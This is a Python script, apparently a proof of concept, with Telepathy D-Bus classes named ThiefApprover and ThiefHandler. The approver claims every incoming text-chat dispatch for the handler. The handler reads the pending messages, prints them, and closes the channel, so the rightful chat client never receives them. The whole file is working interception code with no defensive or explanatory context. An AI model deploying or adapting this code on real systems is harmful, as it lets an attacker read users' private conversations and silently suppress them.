import traceback, sys
import telepathy
import dbus
from telepathy.server import Approver, Handler, Connection
from telepathy.interfaces import CLIENT, CLIENT_APPROVER, CHANNEL,\
        CHANNEL_INTERFACE_MESSAGES, CHANNEL_DISPATCH_OPERATION, CLIENT_HANDLER, \
        CHANNEL_DISPATCHER, CHANNEL, CHANNEL_INTERFACE_MESSAGES


DBUS_PROPERTIES = "org.freedesktop.DBus.Properties"
DO = CHANNEL_DISPATCH_OPERATION
MES = CHANNEL_INTERFACE_MESSAGES


class ThiefApprover(Approver, telepathy.server.DBusProperties):

    def __init__(self, *args):
        telepathy.server.Approver.__init__(self, *args)
        telepathy.server.DBusProperties.__init__(self)

        self._implement_property_get(CLIENT, {
            'Interfaces': lambda: [CLIENT_APPROVER]
        })
        self._implement_property_get(CLIENT_APPROVER, {
            'ApproverChannelFilter': lambda: dbus.Array([
                dbus.Dictionary({
                    "org.freedesktop.Telepathy.Channel.ChannelType":
                    "org.freedesktop.Telepathy.Channel.Type.Text"
                }, signature='sv')
            ], signature='a{sv}')
        })

    def AddDispatchOperation(self, channels, operation, props):
        print("Approver operation")
        try:
            bus = dbus.SessionBus()
            op = bus.get_object(CHANNEL_DISPATCHER, operation)
            opint = dbus.Interface(op, DO)
            opint.HandleWith("org.freedesktop.Telepathy.Client.ThiefHandler")
        except Exception as e:
            print(e.message)

    def claim_cb(self):
        print("claimed")

    def error_cb(self):
        print("error")


class ThiefHandler(Handler, telepathy.server.DBusProperties):
    def __init__(self, *args):
        telepathy.server.Handler.__init__(self, *args)
        telepathy.server.DBusProperties.__init__(self)

        self._implement_property_get(CLIENT, {
            'Interfaces': lambda: [CLIENT_HANDLER]
        })
        self._implement_property_get(CLIENT_HANDLER, {
            'HandlerChannelFilter': lambda: dbus.Array([
                dbus.Dictionary({
                    "org.freedesktop.Telepathy.Channel.ChannelType":
                    "org.freedesktop.Telepathy.Channel.Type.Text"
                }, signature='sv')
            ], signature='a{sv}')
        })
        self._implement_property_get(CLIENT_HANDLER, {
            'BypassApproval': lambda: False
        })
        self._implement_property_get(CLIENT_HANDLER, {
            'Capabilities': lambda: dbus.Array([
            ], signature='as')
        })
        self._implement_property_get(CLIENT_HANDLER, {
            'HandledChannels': lambda: dbus.Array([
            ], signature='ao')
        })

    def HandleChannels(self, account, connection, channels,
                        satisfied, user_action_time, hander_info):
        print("handle channels")
        try:
            bus = dbus.SessionBus()
            print(channels[0][0])
            chan = bus.get_object(connection[1:].replace('/','.'), channels[0][0])
            channel = dbus.Interface(chan, DBUS_PROPERTIES)
            print(channel.Get(MES, "PendingMessages"))
            channel = dbus.Interface(chan, CHANNEL)
            channel.Close()
        except Exception:
            traceback.print_exc()
